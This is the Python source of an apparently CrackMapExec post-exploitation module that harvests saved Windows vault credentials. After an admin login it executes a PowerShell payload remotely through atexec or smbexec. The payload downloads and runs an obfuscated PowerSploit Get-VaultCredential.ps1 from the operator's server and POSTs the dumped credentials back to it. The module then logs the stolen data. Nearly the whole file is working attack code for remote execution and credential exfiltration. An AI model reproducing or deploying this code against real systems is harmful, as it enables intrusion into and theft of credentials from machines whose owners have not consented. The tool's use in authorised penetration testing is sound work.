from cme.helpers import create_ps_command, get_ps_script, obfs_ps_script, gen_random_string, validate_ntlm, write_log
from datetime import datetime
import re

class CMEModule:
    '''
        Executes PowerSploit's Get-VaultCredential.ps1 script
        Module by @byt3bl33d3r
    '''

    name = 'enum_vaultcreds'

    description = "Executes PowerSploit's Get-VaultCredential.ps1 script"

    def options(self, context, module_options):
        '''
        '''
        self.obfs_name = gen_random_string()

    def on_admin_login(self, context, connection):

        payload = '''
        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Get-VaultCredential.ps1');
        $creds = Get-VaultCredential | Out-String;
        $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();'''.format(server=context.server, 
                                          port=context.server_port, 
                                          addr=context.localip)
                                          #func_name=self.obfs_name)

        context.log.debug('Payload: {}'.format(payload))
        payload = create_ps_command(payload)
        connection.execute(payload, methods=['atexec', 'smbexec'])
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Get-VaultCredential.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            with open(get_ps_script('PowerSploit/Exfiltration/Get-VaultCredential.ps1'), 'r') as ps_script:
                ps_script = obfs_ps_script(ps_script.read())#, self.obfs_name)
                request.wfile.write(ps_script)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data):
            context.log.success("Found saved vault credentials:")
            context.log.highlight(data)

            #log_name = 'Mimikatz-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            #write_log(data, log_name)
            #context.log.info("Saved Mimikatz's output to {}".format(log_name))